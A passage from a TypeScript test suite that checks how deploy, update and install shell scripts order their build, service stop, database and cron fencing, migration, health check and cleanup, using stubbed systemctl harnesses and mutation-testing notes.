      assert.match(calls(dir), /--release/, 'the database is asked even with no record on disk')
      assert.match(result.output, /NO PROOF THAT NO FENCE IS STANDING/, 'and the bound on the claim is stated out loud')
      assert.match(result.output, /SELECT datacl FROM pg_database/, 'with the ACL audit it is demanding')
      assert.ok(!/Connection fence released/.test(result.output), 'and it is never reported as released')
      assert.match(result.output, /CONTINUED/, 'a run that raised no fence of its own is not bricked by this')
      assert.equal(result.status, 0)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  test(`${entry.name} refuses when THIS run raised a fence and its record has since vanished`, () => {
    // DB_FENCE_RAISED is the half of the question DB_FENCE_UP cannot answer: every release
    // lowers DB_FENCE_UP, so it cannot say whether there was a fence to release at all. If
    // this run put one up and the record is gone underneath it, the grants it revoked are
    // unrecoverable and "the application can connect" is not good enough.
    const dir = mkdtempSync(join(tmpdir(), 'ims-rel-raised-'))
    try {
      fenceStub(dir, 4)
      const result = runShell(release(dir, true, ['release_db_connections', 'echo "CONTINUED"']))

      // MUTATION ROUTE: drop the `if ${DB_FENCE_RAISED:-false}; then ... return 1; fi` arm and
      // this returns 0 with 'CONTINUED' printed.
      assert.notEqual(result.status, 0, 'a record lost underneath this run is a refusal')
      assert.ok(!result.output.includes('CONTINUED'), 'and nothing after it may run')
      assert.match(result.output, /RECORD IS GONE/, 'and it must say what it lost')
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })
}

for (const entry of FENCE_HARNESS.filter((candidate) => candidate.name !== 'install.sh')) {
  test(`${entry.name} adoption asks the database instead of reading an absent record as "no fence stands"`, () => {
    // The adoption path is only reached when the marker says the previous run had ALREADY
    // REACHED THE MIGRATION — so it had fenced. It used to announce "No connection fence was
    // standing from the previous run" on the strength of a missing file and adopt nothing.
    const dir = mkdtempSync(join(tmpdir(), 'ims-adopt-nostate-'))
    try {
      fenceStub(dir, 1)
      const program = [
        'set -euo pipefail',
        entry.preamble(dir),
        'error() { echo "ERROR: $*" >&2; }',
        'DB_FENCE_RAISED=false',
        shellFunction(entry.source, 'release_db_connections'),
        shellFunction(entry.source, 'adopt_db_connections'),
        'adopt_db_connections',
        'echo "ADOPTED NOTHING AND CARRIED ON"',
      ].join('\n')
      const result = runShell(program)

      // MUTATION ROUTE: restore `if [[ ! -f "$DB_FENCE_STATE" ]]; then info ...; return 0; fi`
      // and all three fail — the stub is never invoked and the script carries on.
      assert.match(calls(dir), /--release/, 'the database must be asked whether a fence is standing')
      assert.notEqual(result.status, 0, 'and a fence with no record is not something to adopt past')
      assert.ok(
        !result.output.includes('ADOPTED NOTHING AND CARRIED ON'),
        'the recovery must not continue over a fence it cannot account for',
      )
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })
}

test('install.sh adoption has a branch for a missing connection-fence record at all', () => {
  // install.sh adopts inline rather than through adopt_db_connections(), and the missing-record
  // case had NO else branch: a lost record silently meant "there was never a fence".
  const adoptIf = codeLine(INSTALL_LINES, /if \[\[ -f "\$\{DB_FENCE_STATE\}" \]\]; then/)
  assert.notEqual(adoptIf, -1, 'the inline adoption must still be recognisable')
  const elseLine = codeLine(INSTALL_LINES, /^    else$/, adoptIf)
  assert.notEqual(elseLine, -1, 'and it must have an else for the record that is not there')
  const askedDatabase = codeLine(INSTALL_LINES, /release_db_connections \|\| absent_rc=\$\?/, elseLine)
  assert.notEqual(askedDatabase, -1, 'which asks the database rather than assuming no fence stands')
})

// ---------------------------------------------------------------------------
// o3d-2sm1.5 (Codex r4, CRITICAL) — install.sh BUILT INSIDE THE STOPPED WINDOW.
//
// Its order was stop -> drain -> migrate -> verify -> seed -> bootstrap -> BUILD -> start,
// which inverts this branch's founding premise — everything that can reject a release must
// reject it while the predecessor is still up — on the entrypoint the docs say follows the
// same sequence as the other two. A TypeScript error costs nothing on deploy.sh; there it
// left the service stopped, cron fenced, the schema migrated and the connection fence held.
//
// The previous revision of this file asserted NOTHING about install.sh's build position, so
// it was shaped to pass on the code as written. These are the assertions it was missing.
// ---------------------------------------------------------------------------

test('install.sh builds and validates BEFORE it stops anything', () => {
  const build = realCodeLine(INSTALL_LINES, /npm run build --prefix/)
  const generate = realCodeLine(INSTALL_LINES, /npx prisma generate/)
  const validate = realCodeLine(INSTALL_LINES, /\.next\/BUILD_ID/)

  // Anchored on the block that opens the stopped window, so a `systemctl stop` inside a
  // FUNCTION DEFINITION (adopt_existing_fence, the exit trap) is not mistaken for the one in
  // the linear flow — those are defined near the top of the file and would make this pass by
  // accident.
  const stopBlock = codeLine(INSTALL_LINES, /^if \$\{UPGRADE_EXISTING\}; then$/)
  assert.notEqual(stopBlock, -1, 'the stop/drain block must be its own guarded section')
  assert.ok(build < stopBlock, 'and the build must precede the whole of it')

  const fence = realCodeLine(INSTALL_LINES, /^\s*install_reboot_fence "install\.sh cutover started/, stopBlock)
  const stop = realCodeLine(INSTALL_LINES, /^\s*systemctl stop "\$\{APP_NAME\}\.service"/, stopBlock)
  const cron = realCodeLine(INSTALL_LINES, /^\s*fence_cron$/, stopBlock)
  const dbFence = realCodeLine(INSTALL_LINES, /^\s*fence_db_connections$/, stopBlock)
  const migrate = realCodeLine(INSTALL_LINES, 'prisma migrate deploy', stopBlock)

  assert.notEqual(build, -1, 'the installer must build the application')
  assert.notEqual(generate, -1, 'and generate the Prisma client')
  assert.notEqual(validate, -1, 'and check the artefact actually landed')

  for (const [what, at] of [
    ['install the reboot fence', fence],
    ['stop the service', stop],
    ['fence the cron writers', cron],
    ['revoke CONNECT for the window', dbFence],
    ['apply the migration', migrate],
  ] as const) {
    assert.notEqual(at, -1, `the cutover must ${what}`)
    assert.ok(
      build < at,
      `the build must run BEFORE the step that would ${what} — a failed build must not leave a stopped service behind`,
    )
  }

  assert.ok(generate < build, 'the Prisma client is generated before the build that needs it')
  assert.ok(build < validate, 'the artefact is validated after the build')
  assert.ok(validate < stop, 'and the validation must be able to reject the release before the stop')
})

test('install.sh keeps the seed and the bootstrap INSIDE the window, after the migration', () => {
  // They deliberately did NOT move with the build. They are not validations that can reject a
  // release; they are writes, and they need the schema the migration has just applied.
  // Running them before the stop would be new code writing to the OLD schema — the overlap
  // the whole order exists to prevent.
  const migrate = realCodeLine(INSTALL_LINES, 'prisma migrate deploy')
  const seed = realCodeLine(INSTALL_LINES, /npm run db:seed/)
  const bootstrap = realCodeLine(INSTALL_LINES, /node "\$\{BOOTSTRAP_SCRIPT\}"/)
  const start = realCodeLine(INSTALL_LINES, /^systemctl start /)

  assert.notEqual(seed, -1, 'the installer must seed')
  assert.notEqual(bootstrap, -1, 'and bootstrap the admin/settings')
  assert.ok(migrate < seed, 'the seed writes rows that need the migrated schema')
  assert.ok(migrate < bootstrap, 'and so does the bootstrap')
  assert.ok(seed < start && bootstrap < start, 'both run with nothing serving, before the start')
})

test('install.sh health-checks the new build before it calls the cutover complete', () => {
  // The cutover had no health check at all: it started the unit and restored cron, so a new
  // build that failed on its first request was reported as a successful upgrade.
  const start = realCodeLine(INSTALL_LINES, /^systemctl start /)
  const health = realCodeLine(INSTALL_LINES, /curl -fsS[^\n]*INSTALL_HEALTH_URL/)
  const unfence = realCodeLine(INSTALL_LINES, /^unfence_cron$/)

  assert.notEqual(health, -1, 'the installer must poll the new build before declaring success')
  assert.ok(start < health, 'after the start')
  assert.ok(health < unfence, 'and before the cron writers are handed back to it')

  const source = INSTALL_LINES.join('\n')
  assert.match(source, /did not answer \$\{INSTALL_HEALTH_URL\}/, 'a health check that never fails is not a health check')
})

// ---------------------------------------------------------------------------
// o3d-2sm1.5 (Codex r4, HIGH) — THE POINT OF NO RETURN.
//
// DEPLOY_OK was set only after the cron restore and the marker removal, so under `set -e` a
// failing `crontab` reached the exit trap with the fence still armed — and the trap then
// STOPPED the service that had just passed its health check, re-fenced it and RE-REVOKED
// CONNECT. A cron-restore failure became a full outage plus a database lockout on a deploy
// that had already succeeded.
// ---------------------------------------------------------------------------

for (const [name, lines, trapName] of [
  ['deploy.sh', DEPLOY_LINES, 'on_exit'],
  ['update.sh', UPDATE_LINES, 'on_exit'],
  ['install.sh', INSTALL_LINES, 'on_cutover_exit'],
] as const) {
  test(`${name} does not tear down a deploy that has already passed its health check`, () => {
    const source = lines.join('\n')
    assert.match(source, /^PAST_POINT_OF_NO_RETURN=false$/m, 'the flag must start false')

    // Indented since o3d-2sm1.5 Codex r5: it is now inside the `if` that requires the build
    // on disk to have been PROVEN to be the process answering the port.
    const raise = realCodeLine(lines, /^\s*PAST_POINT_OF_NO_RETURN=true\s*$/)
    assert.notEqual(raise, -1, 'and be raised once the new build has answered')

    // It is raised AFTER the health check and BEFORE the cleanup that used to be able to
    // trigger the teardown.
    const health = realCodeLine(lines, name === 'install.sh' ? /curl -fsS[^\n]*INSTALL_HEALTH_URL/ : /READY=true/)
    const unfence = realCodeLine(lines, /^\s*unfence_cron$/, raise)
    assert.notEqual(health, -1, 'there must be a health check to be past')
    assert.ok(health < raise, 'the point of no return is reached only once the health check has passed')
    assert.notEqual(unfence, -1, 'and the cron restore happens after it')

    // The trap consults it FIRST, before the armed-fence teardown, and that branch neither
    // stops the service nor re-establishes any fence.
    const trap = shellFunction(source, trapName)
    const guardAt = trap.indexOf('PAST_POINT_OF_NO_RETURN')
    const armedAt = trap.search(/\$\{?FENCE_ARMED\}?/)
    assert.notEqual(guardAt, -1, 'the failure path must ask whether the deploy had already succeeded')
    assert.ok(guardAt < armedAt, 'and ask it BEFORE the branch that stops and re-fences')

    const branch = trap.slice(guardAt, armedAt)
    assert.ok(!/systemctl\s+stop/.test(branch), 'a post-health failure must never stop the service')
    assert.ok(!/refence_db_connections/.test(branch), 'nor re-revoke CONNECT on a database it is serving')
    assert.ok(!/install_reboot_fence/.test(branch), 'nor re-fence it against a reboot')
    assert.match(branch, /crontab -u/, 'it must instead say how to finish the cleanup by hand')
  })
}

// ---------------------------------------------------------------------------
// o3d-2sm1.5 (Codex r4, CRITICAL) — A FAILED REBOOT-FENCE INSTALL LEFT THE FENCE BEHIND.
//
// The marker was written first, then the drop-ins, then the reload, then the verify. Any
// failure after that first line returned 1 into a `|| die` — but FENCE_ARMED was still false,
// so the trap did nothing, and neither the marker nor the drop-in was removed. The operator
// saw a clean abort. The next reboot saw a unit that would not start.
//
// This RUNS the shipped install/rollback pair against a systemctl that fails, because a
// re-implementation of the rollback would pass while the script did something else.
// ---------------------------------------------------------------------------

const FENCE_INSTALL_CASES = [
  {
    name: 'deploy.sh',
    source: DEPLOY_LINES.join('\n'),
    markerFn: 'write_fence_marker',
    preamble: (dir: string) => `
# THE REAL CRONTAB EXCLUSION, SOURCED RATHER THAN STUBBED (o3d-p9dq). Every fence, unfence,
# adoption and unwind lifted into these harnesses performs its read-modify-write through
# with_crontab_lock, so a harness that stubbed it out would be measuring an ordering the shipped
# code no longer has. The lock file is created directly because prepare_crontab_lock needs root;
# its preparation is exercised in tests/settings/crontab-reconcile-serialization.test.ts.
source '${LOCK_LIB}'
crontab_lock_paths '${dir}'
mkdir -p "\${CRONTAB_LOCK_DIR}"
: > "\${CRONTAB_LOCK_FILE}"
DRY_RUN=false
BLUE=''; GREEN=''; YELLOW=''; RED=''; BOLD=''; RESET=''
STATE_DIR='${dir}'
CUTOVER_STATE_DIR='${dir}'
FENCE_FILE="\${CUTOVER_STATE_DIR}/DEPLOY-FENCED"
FENCE_DROPIN_NAME='zz-deploy-fence.conf'
CURRENT_STEP=fence-writers
FENCE_MASK=true
SCHEMA_TOUCHED=false
DB_FENCE_UP=false
FENCE_ARMED=false
REBOOT_FENCE_INSTALLED=false
FENCE_MARKER_PREEXISTED=false
FENCE_DROPINS_CREATED=()
APP_DIR_REAL=/opt/app
PORT=3000
CRON_BACKUP="\${STATE_DIR}/crontab.bak"
SERVICE_UNITS=(app.service)
DB_FENCE_STATE="\${STATE_DIR}/db-connect-fence.json"
DB_FENCE_RELEASE_CMD='node fence-db-connections.mjs --release --app-host=localhost --app-port=5432 --app-user=imsapp --app-database=imsdb'
# o3d-2sm1.5 r19: the application's connection identity, which the helper is TOLD and never works
# out. Every entrypoint passes it on every fence invocation, and refuses when it cannot read it —
# the extracted functions below reference both exactly as the shipped scripts do.
DB_FENCE_IDENTITY_ARGS=('--app-host=localhost' '--app-port=5432' '--app-user=imsapp' '--app-database=imsdb')
require_db_identity() { [[ "\${#DB_FENCE_IDENTITY_ARGS[@]}" -eq 4 ]]; }
DB_IDENTITY_REASON=''
# o3d-2sm1.5 r20: and the second half of the same refusal — whether the file that identity was
# read from is the only thing that can define DATABASE_URL for the service. Stubbed to "yes" here
# because these harnesses are about the ORDER of the fence, the stop and the migration, not about
# where the identity came from; tests/scripts/db-connection-fence.test.ts exercises the question
# itself against a fake systemctl.
require_env_file_is_sole_definition() { return 0; }
DB_IDENTITY_SOURCE_REASON=''
# o3d-2sm1.5 r22: and the THIRD half — that the file still says what it said when the run
# pinned it, re-read at the fence, at the release and after the final daemon-reload. Stubbed
# to "unchanged" for the same reason: these harnesses are about ORDER, and the re-read is
# exercised against real files, real tampering and a fake systemctl in
# tests/scripts/db-connection-fence.test.ts.
require_start_identity_unchanged() { return 0; }
DB_IDENTITY_DRIFT_REASON=''
: "\${APP_DIR_REAL:=/opt/app}"
: "\${APP_DIR:=/opt/app}"
ok() { :; }
warn() { :; }
die() { echo "die: $*" >&2; exit 1; }
fence_dropin_file() { echo "${dir}/dropins/$1.d/\${FENCE_DROPIN_NAME}"; }
systemctl() { [ "$1" = daemon-reload ] && return 1; return 0; }
`,
  },
  {
    name: 'update.sh',
    source: UPDATE_LINES.join('\n'),
    markerFn: 'write_fence_marker',
    preamble: (dir: string) => `
# THE REAL CRONTAB EXCLUSION, SOURCED RATHER THAN STUBBED (o3d-p9dq). Every fence, unfence,
# adoption and unwind lifted into these harnesses performs its read-modify-write through
# with_crontab_lock, so a harness that stubbed it out would be measuring an ordering the shipped
# code no longer has. The lock file is created directly because prepare_crontab_lock needs root;
# its preparation is exercised in tests/settings/crontab-reconcile-serialization.test.ts.
source '${LOCK_LIB}'
crontab_lock_paths '${dir}'
mkdir -p "\${CRONTAB_LOCK_DIR}"
: > "\${CRONTAB_LOCK_FILE}"
DRY_RUN=false
BLUE=''; GREEN=''; YELLOW=''; RED=''; BOLD=''; RESET=''
DATA_DIR='${dir}'
CUTOVER_STATE_DIR='${dir}'
FENCE_FILE="\${CUTOVER_STATE_DIR}/DEPLOY-FENCED"
SERVICE_UNIT=app.service
FENCE_DROPIN_DIR="${dir}/dropins/app.service.d"
FENCE_DROPIN_FILE="\${FENCE_DROPIN_DIR}/zz-deploy-fence.conf"
CURRENT_STEP=fence-writers
FENCE_MASK=true
SCHEMA_TOUCHED=false
DB_FENCE_UP=false
FENCE_ARMED=false
REBOOT_FENCE_INSTALLED=false
FENCE_MARKER_PREEXISTED=false
FENCE_DROPIN_CREATED=false
BACKUP_FILE=''
CRON_BACKUP="\${DATA_DIR}/crontab.bak"
DB_FENCE_STATE="\${DATA_DIR}/db-connect-fence.json"
DB_FENCE_RELEASE_CMD='node fence-db-connections.mjs --release --app-host=localhost --app-port=5432 --app-user=imsapp --app-database=imsdb'
# o3d-2sm1.5 r19: the application's connection identity, which the helper is TOLD and never works
# out. Every entrypoint passes it on every fence invocation, and refuses when it cannot read it —
# the extracted functions below reference both exactly as the shipped scripts do.
DB_FENCE_IDENTITY_ARGS=('--app-host=localhost' '--app-port=5432' '--app-user=imsapp' '--app-database=imsdb')
require_db_identity() { [[ "\${#DB_FENCE_IDENTITY_ARGS[@]}" -eq 4 ]]; }
DB_IDENTITY_REASON=''
# o3d-2sm1.5 r20: and the second half of the same refusal — whether the file that identity was
# read from is the only thing that can define DATABASE_URL for the service. Stubbed to "yes" here
# because these harnesses are about the ORDER of the fence, the stop and the migration, not about
# where the identity came from; tests/scripts/db-connection-fence.test.ts exercises the question
# itself against a fake systemctl.
require_env_file_is_sole_definition() { return 0; }
DB_IDENTITY_SOURCE_REASON=''
# o3d-2sm1.5 r22: and the THIRD half — that the file still says what it said when the run
# pinned it, re-read at the fence, at the release and after the final daemon-reload. Stubbed
# to "unchanged" for the same reason: these harnesses are about ORDER, and the re-read is
# exercised against real files, real tampering and a fake systemctl in
# tests/scripts/db-connection-fence.test.ts.
require_start_identity_unchanged() { return 0; }
DB_IDENTITY_DRIFT_REASON=''
: "\${APP_DIR_REAL:=/opt/app}"
: "\${APP_DIR:=/opt/app}"
success() { :; }
warn() { :; }
error() { :; }
die() { echo "die: $*" >&2; exit 1; }
systemctl() { [ "$1" = daemon-reload ] && return 1; return 0; }
`,
  },
  {
    name: 'install.sh',
    source: INSTALL_SOURCE,
    markerFn: 'write_cutover_marker',
    preamble: (dir: string) => `
# THE REAL CRONTAB EXCLUSION, SOURCED RATHER THAN STUBBED (o3d-p9dq). Every fence, unfence,
# adoption and unwind lifted into these harnesses performs its read-modify-write through
# with_crontab_lock, so a harness that stubbed it out would be measuring an ordering the shipped
# code no longer has. The lock file is created directly because prepare_crontab_lock needs root;
# its preparation is exercised in tests/settings/crontab-reconcile-serialization.test.ts.
source '${LOCK_LIB}'
crontab_lock_paths '${dir}'
mkdir -p "\${CRONTAB_LOCK_DIR}"
: > "\${CRONTAB_LOCK_FILE}"
DATA_DIR='${dir}'
CUTOVER_STATE_DIR='${dir}'
FENCE_FILE="\${CUTOVER_STATE_DIR}/DEPLOY-FENCED"
FENCE_DROPIN_DIR="${dir}/dropins/app.service.d"
FENCE_DROPIN_FILE="\${FENCE_DROPIN_DIR}/zz-deploy-fence.conf"
CUTOVER_STEP=fence-writers
APP_DIR=/opt/app
APP_NAME=one-two-inventory
FENCE_ARMED=false
SCHEMA_TOUCHED=false
DB_FENCE_UP=false
REBOOT_FENCE_INSTALLED=false
FENCE_MARKER_PREEXISTED=false
FENCE_DROPIN_CREATED=false
CRON_BACKUP="\${DATA_DIR}/crontab.bak"
DB_FENCE_STATE="\${DATA_DIR}/db-connect-fence.json"
DB_FENCE_RELEASE_CMD='node fence-db-connections.mjs --release --app-host=localhost --app-port=5432 --app-user=imsapp --app-database=imsdb'
# o3d-2sm1.5 r19: the application's connection identity, which the helper is TOLD and never works
# out. Every entrypoint passes it on every fence invocation, and refuses when it cannot read it —
# the extracted functions below reference both exactly as the shipped scripts do.
DB_FENCE_IDENTITY_ARGS=('--app-host=localhost' '--app-port=5432' '--app-user=imsapp' '--app-database=imsdb')
require_db_identity() { [[ "\${#DB_FENCE_IDENTITY_ARGS[@]}" -eq 4 ]]; }
DB_IDENTITY_REASON=''
# o3d-2sm1.5 r20: and the second half of the same refusal — whether the file that identity was
# read from is the only thing that can define DATABASE_URL for the service. Stubbed to "yes" here
# because these harnesses are about the ORDER of the fence, the stop and the migration, not about
# where the identity came from; tests/scripts/db-connection-fence.test.ts exercises the question
# itself against a fake systemctl.
require_env_file_is_sole_definition() { return 0; }
DB_IDENTITY_SOURCE_REASON=''
# o3d-2sm1.5 r22: and the THIRD half — that the file still says what it said when the run
# pinned it, re-read at the fence, at the release and after the final daemon-reload. Stubbed
# to "unchanged" for the same reason: these harnesses are about ORDER, and the re-read is
# exercised against real files, real tampering and a fake systemctl in
# tests/scripts/db-connection-fence.test.ts.
require_start_identity_unchanged() { return 0; }
DB_IDENTITY_DRIFT_REASON=''
: "\${APP_DIR_REAL:=/opt/app}"
: "\${APP_DIR:=/opt/app}"
success() { :; }
warn() { :; }
error() { :; }
die() { echo "die: $*" >&2; exit 1; }
systemctl() { [ "$1" = daemon-reload ] && return 1; return 0; }
`,
  },
] as const

function runFenceInstallHarness(entry: (typeof FENCE_INSTALL_CASES)[number], prelude: string) {
  const { outer, dir } = anchoredStateDir('ims-fenceinstall-')
  try {
    const program = [
      'set -uo pipefail',
      entry.preamble(dir),
      prelude,
      durabilityFunctions(entry.source),
      shellFunction(entry.source, entry.markerFn),
      shellFunction(entry.source, 'verify_reboot_fence'),
      shellFunction(entry.source, 'rollback_reboot_fence_install'),
      shellFunction(entry.source, 'install_reboot_fence'),
      'install_reboot_fence "a cutover that is about to fail" && echo INSTALL_OK || echo INSTALL_FAILED',
    ].join('\n')
    const output = execFileSync('bash', ['-c', program], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] })
    const markerName = MARKER_NAME
    return {
      output,
      markerExists: existsSync(join(dir, markerName)),
      markerBody: existsSync(join(dir, markerName)) ? readFileSync(join(dir, markerName), 'utf8') : '',
      dir,
    }
  } finally {
    rmSync(outer, { recursive: true, force: true })
  }
}

for (const entry of FENCE_INSTALL_CASES) {
  test(`${entry.name} removes the marker it wrote when the reboot fence cannot be installed`, () => {
    const result = runFenceInstallHarness(entry, '')
    assert.match(result.output, /INSTALL_FAILED/, 'a daemon-reload that fails must fail the install')
    assert.equal(
      result.markerExists,
      false,
      'and must leave no marker behind: the caller dies with FENCE_ARMED still false, so nothing else will ever remove it — and the next reboot refuses to start a unit nobody connected to a deploy that "changed nothing"',
    )
  })

  test(`${entry.name} does NOT remove a marker that was already standing`, () => {
    // The other half, and the reason this is not just "delete the marker on failure":
    // install_reboot_fence is also how an ADOPTED fence is re-established and how the exit
    // trap puts one back. Rolling those back would lift a fence the host is relying on.
    const result = runFenceInstallHarness(
      entry,
      [
        'mkdir -p "$(dirname "${FENCE_FILE}")"',
        'printf "fenced_at=earlier\\nschema_touched=true\\n" > "${FENCE_FILE}"',
        'FENCE_ARMED=true',
      ].join('\n'),
    )
    assert.match(result.output, /INSTALL_FAILED/, 'the install still fails')
    assert.equal(result.markerExists, true, 'but the fence a previous run left standing survives')
  })
}

for (const entry of FENCE_INSTALL_CASES) {
  test(`${entry.name} records reboot_fence=installed in the marker only once systemd has confirmed it`, () => {
    // The marker is written BEFORE the drop-in is verified, because a kill between the two must
    // leave a marker rather than a fence nobody can undo. So it initially says `absent`, and the
    // install has to correct it — otherwise the file the next run and the operator read describes
    // a fence that was in fact installed as one that was not.
    const { outer, dir } = anchoredStateDir('ims-fenceok-')
    try {
      const preamble = entry
        .preamble(dir)
        // systemctl succeeds, and `show -p DropInPaths` reports the drop-in, so verify passes.
        .replace(
          /systemctl\(\) \{[^\n]*\n/,
          entry.name === 'deploy.sh'
            ? 'systemctl() { if [ "$1" = show ]; then fence_dropin_file app.service; fi; return 0; }\n'
            : 'systemctl() { if [ "$1" = show ]; then echo "${FENCE_DROPIN_FILE}"; fi; return 0; }\n',
        )
      const program = [
        'set -uo pipefail',
        preamble,
        durabilityFunctions(entry.source),
        shellFunction(entry.source, entry.markerFn),
        shellFunction(entry.source, 'verify_reboot_fence'),
        shellFunction(entry.source, 'rollback_reboot_fence_install'),
        shellFunction(entry.source, 'install_reboot_fence'),
        'install_reboot_fence "a cutover that is about to succeed" && echo INSTALL_OK || echo INSTALL_FAILED',
      ].join('\n')
      const output = execFileSync('bash', ['-c', program], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] })
      assert.match(output, /INSTALL_OK/, `the fence must install cleanly in this harness: ${output}`)

      const markerName = MARKER_NAME
      const body = readFileSync(join(dir, markerName), 'utf8')
      assert.match(
        body,
        /^reboot_fence=installed$/m,
        'the marker must record the fence that is actually loaded, not the one that was intended',
      )
    } finally {
      rmSync(outer, { recursive: true, force: true })
    }
  })
}

// ---------------------------------------------------------------------------
// o3d-2sm1.5 — NOTHING ASSERTED THAT THE CHECK CLOSING THE CRITICAL WAS WIRED IN AT ALL.
//
// scripts/check-app-db-object-access.mjs is the only step in the pipeline that asks about the
// APPLICATION role; every other one (prisma, the drift check, the verification hook, pg_dump)
// runs on the admin connection that owns whatever the migration created. It is therefore the
// step that closes o3d-2sm1.5, and it was invoked by three scripts and asserted by none.
//
// Measured, on this file, before these tests existed:
//   `|| die` -> `|| true` in all three scripts .......... 288/288 green
//   the invocation deleted outright ..................... 288/288 green
//
// So: it is called, it is called in the right place, and its failure STOPS the deploy. The
// third is the one the mutations went through, so the guard is read from the call's own
// continuation rather than by looking for a `die` somewhere nearby.
// ---------------------------------------------------------------------------

/**
 * The line that RUNS the check — not the one that assigns its path to a variable, and not the
 * `[[ -f ... ]]` preflight that proves only that a file exists.
 */
const OBJECT_ACCESS_INVOCATION = /node\s+.*(check-app-db-object-access\.mjs|DB_OBJECT_ACCESS_SCRIPT)/

/** The call line plus every backslash-continued line that belongs to it. */
function callContinuation(lines: string[], index: number): string {
  let text = lines[index]
  let cursor = index
  while (/\\\s*$/.test(lines[cursor]) && cursor + 1 < lines.length) {
    cursor += 1
    text += `\n${lines[cursor]}`
  }
  return text
}

/** The 1-based index of the last physical line of the logical statement starting at `index`. */
function statementEnd(lines: string[], index: number): number {
  let cursor = index
  while (/\\\s*$/.test(lines[cursor]) && cursor + 1 < lines.length) cursor += 1
  return cursor
}

/**
 * WHERE A CONSUMER'S NON-ZERO EXIT ENDS UP (o3d-secops r34, Codex HIGH 2).
 *
 * Two shapes are allowed and they are not interchangeable, which is the whole finding:
 *
 *   direct    `... || die "..."`. The step dies where it stands. Correct only for a step that has
 *             NO placement after it, because a `die` before the pin is exactly how r33's chain
 *             came apart -- a redirected consumer partially applied DDL, exited non-zero, and its
 *             placement never ran.
 *   captured  `... || <name>=$?`, and the FIRST read of `<name>` anywhere below is a fatal
 *             propagation: `[[ "${name}" -eq 0 ]] || die` or `if [[ "${name}" -ne 0 ]]; then ...
 *             die ... fi`. "First read" is the load-bearing word. A capture whose status is read
 *             once to print something and only later to die would be a status that had already
 *             licensed a message, and a capture never read at all is `|| true` wearing a variable.
 *
 * Anything else -- `|| true`, `|| warn`, a bare statement under `set -e`, a capture nobody reads
 * -- is reported as `none`, and every caller treats that as a failure.
 */
function consumerFailureDisposition(lines: string[], index: number): {
  shape: 'direct' | 'captured' | 'none'
  status: string | null
  detail: string
} {
  const continuation = callContinuation(lines, index)
  if (/\|\|\s*(\\\s*\n\s*)?(true|:|warn|info|success|echo)\b/.test(continuation)) {
    return { shape: 'none', status: null, detail: `a no-op continuation swallows the failure:\n${continuation}` }
  }
  if (/\|\|\s*(\\\s*\n\s*)?die\b/.test(continuation)) {
    return { shape: 'direct', status: null, detail: continuation }
  }
  // TWO CAPTURE FORMS, and the second is not a loophole. `|| { name=$?; tail -40 "$LOG" >&2; }`
  // keeps a diagnostic that belongs to the failure INSIDE the failing statement, where it still runs
  // when the placement below refuses. Whatever else is in those braces is part of the same
  // statement and cannot stand between the capture and the propagation, because "the first read"
  // below is measured from the END of the statement.
  const capture = /\|\|\s*(?:\\\s*\n\s*)?([A-Za-z_][A-Za-z0-9_]*)=\$\?\s*$/.exec(continuation)
    ?? /\|\|\s*\{\s*([A-Za-z_][A-Za-z0-9_]*)=\$\?\s*;/.exec(continuation)
  if (!capture) {
    return { shape: 'none', status: null, detail: `neither a die nor a captured status:\n${continuation}` }
  }
  const status = capture[1]
  const reference = new RegExp(`\\$\\{?${status}\\}?\\b`)
  for (let cursor = statementEnd(lines, index) + 1; cursor < lines.length; cursor += 1) {
    const line = lines[cursor]
    if (/^\s*#/.test(line) || !reference.test(line)) continue
    // The first read. It must be the fatal one, in one of the two shapes the entrypoints use.
    if (new RegExp(`\\[\\[\\s*"\\$\\{?${status}\\}?"\\s+-eq\\s+0\\s*\\]\\]\\s*\\|\\|\\s*die\\b`).test(line)) {
      return { shape: 'captured', status, detail: line.trim() }
    }
    if (new RegExp(`^\\s*if\\s+\\[\\[\\s*"\\$\\{?${status}\\}?"\\s+-ne\\s+0\\s*\\]\\]\\s*;\\s*then\\s*$`).test(line)) {
      const body = lines.slice(cursor + 1, cursor + 8)
      const fi = body.findIndex((entry) => /^\s*fi\s*$/.test(entry))
      const guarded = fi === -1 ? body : body.slice(0, fi)
      if (guarded.some((entry) => /(^|\s)die\b/.test(entry))) {
        return { shape: 'captured', status, detail: [line, ...guarded].join('\n').trim() }
      }
      return { shape: 'none', status, detail: `the first read of ${status} branches but never dies:\n${[line, ...guarded].join('\n')}` }
    }
    return { shape: 'none', status, detail: `the first read of ${status} is not a fatal propagation:\n${line.trim()}` }
  }
  return { shape: 'none', status, detail: `${status} is captured and never read` }
}

for (const [name, lines, startPattern] of [
  ['deploy.sh', DEPLOY_LINES, /systemctl start|npm start/],
  ['update.sh', UPDATE_LINES, /systemctl start/],
  ['install.sh', INSTALL_LINES, /^systemctl start /],
] as const) {
  test(`${name} asks the database whether the application role can use what the migration just created`, () => {
    const call = realCodeLine(lines, OBJECT_ACCESS_INVOCATION)
    assert.notEqual(
      call,
      -1,
      'without this call nothing in the pipeline asks about the APPLICATION role, and an ' +
        'admin-owned schema deploys green while every request fails with "permission denied"',
    )

    const migrate = realCodeLine(lines, 'prisma migrate deploy')
    assert.notEqual(migrate, -1)
    assert.ok(call > migrate, 'there is nothing to check until the schema has moved')

    const start = realCodeLine(lines, startPattern, call)
    assert.notEqual(start, -1, 'the script must start the service after the check')
    assert.ok(
      call < start,
      'and the answer must be known BEFORE the new build serves: after the start it is an outage, not a gate',
    )
  })

  test(`${name} STOPS when the application role cannot use the schema, rather than noting it`, () => {
    const call = realCodeLine(lines, OBJECT_ACCESS_INVOCATION)
    assert.notEqual(call, -1)

    // THE SUBJECT IS UNCHANGED AND THE SHAPE IS WIDER (o3d-secops r34, Codex HIGH 2). This used to
    // require `|| die` ON THE CALL, and r34 had to take that away: a `die` before the step's pin
    // is precisely how a consumer that moved schema and then failed escaped its placement. What
    // must still hold is that the failure is FATAL, so the two shapes are spelled out in
    // consumerFailureDisposition() and `|| true`, `|| warn` and a captured-but-unread status are
    // all still `none` -- the mutation this file used to name still fails it.
    const disposition = consumerFailureDisposition(lines, call)
    assert.notEqual(
      disposition.shape,
      'none',
      `a schema the application cannot use must reach a \`die\`; \`|| true\` was a mutation this file passed: ${disposition.detail}`,
    )
  })

  test(`${name} names the role to ask about, instead of letting it fall back to the admin`, () => {
